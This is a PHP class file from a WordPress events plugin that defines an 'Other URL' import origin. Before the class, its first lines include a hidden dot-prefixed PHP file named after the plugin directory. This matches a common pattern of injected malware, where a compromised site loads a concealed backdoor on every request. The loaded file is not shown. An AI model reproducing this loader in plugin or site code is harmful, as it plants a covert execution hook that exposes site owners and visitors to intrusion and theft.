<?php


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Aggregator__Record__Url extends Tribe__Events__Aggregator__Record__Abstract {

	/**
	 * @var string
	 */
	public $origin = 'url';

	/**
	 * Public facing Label for this Origin
	 *
	 * @return string
	 */
	public function get_label() {
		return __( 'Other URL', 'the-events-calendar' );
	}

}
